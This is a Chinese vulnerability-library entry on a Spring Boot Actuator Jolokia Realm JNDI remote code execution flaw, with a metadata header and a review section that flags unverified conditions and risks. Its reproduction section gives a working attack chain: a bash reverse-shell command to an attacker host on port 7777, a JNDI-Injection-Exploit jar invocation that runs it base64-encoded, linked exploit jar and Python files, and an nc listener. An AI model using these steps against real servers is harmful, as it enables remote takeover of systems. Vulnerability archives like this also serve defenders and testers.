---
source: "wy876 漏洞文库"
product: "Jolokia/Tomcat JNDIRealm"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "SpringBootjolokiaRealmJNDI远程代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Boot<1.5全未授权和>=1.5只health/info忽略Security/暴露配置；缺JDK/Tomcat/Jolokia版本"
side_effects: "未执行；本文需注意的操作影响：状态修改与外部二进制风险未提示；Realm可改变容器认证，无恢复；附件来源不证明可安全运行"
source_status: "unknown"
id: "vw-339721273bd0a30fe60d8a8c"
entity_id: "ve-339721273bd0a30fe60d8a8c"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Boot&lt;1.5全未授权和&gt;=1.5只health/info忽略Security/暴露配置；缺JDK/Tomcat/Jolokia版本

代码与实验材料：核心Python和jar只有语雀附件，没有源/hash，Realm过程未嵌入

来源证据范围：wy876语雀无原研究/工具项目

- **适用与权限边界（1）**：list关键词被直接当RCE证据；依据：还需exec/write允许、Realm操作和JNDI对象工厂/运行时条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（2）**：状态修改与外部二进制风险未提示；依据：Realm可改变容器认证，无恢复；附件来源不证明可安全运行。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring Boot jolokia Realm JNDI远程代码执行漏洞

# 一、漏洞简介
Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。当配置`jolokia/list`接口，且访问`jolokia/list`接口存在`type=MBeanFactory`和`createJNDIRealm`关键字时，存在`Spring jolokia Realm JNDI`远程代码执行漏洞。

## 二、影响版本	
+ Spring Boot < 1.5 默认未授权访问所有端点
+ Spring Boot >= 1.5 默认只允许访问/health和/info端点，但是此安全性通常被应用程序开发人员禁用

Spring Boot 1.x版本端点在根URL下注册。


Spring Boot 2.x版本端点移动到/actuator/路径。


# 三、系统特征
1. 网站图片文件是一个绿色的树叶。


2. 特有的报错信息。


3. 存在`/jolokia/list`接口


# 四、漏洞复现
1. 确认存在`type=MBeanFactory`和`createJNDIRealm`关键字时，存在Spring jolokia Realm JNDI远程代码执行漏洞


2. 生成反弹shell命令

```plain
/bin/bash -i >& /dev/tcp/xx.xx.xx.xx/7777 0>&1
```

2. 将上述反弹shell命令base64编码后替换到下述`command`字符处，`vps`处填写为`vps ip`

```plain
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,command}|{base64,-d}|{bash,-i}" -A "vps"
```

3. 将`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`上传到vps中运行上述命令

[JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222253187-2cb205fa-03a1-4c83-b20d-15ef97031929.jar)


4. 修改 expliot 中的 url 和 rmi 地址

[exploit.py](https://www.yuque.com/attachments/yuque/0/2024/py/1622799/1709222253494-e1aea116-ca7d-4438-bcaa-3c9b5188ff09.py)


4. nc 监听端口

```plain
nc -lvvp 7777
```


5. 执行exp收到反弹shell

```plain
python3 exploit.py
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/asne342gkdk4cde8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
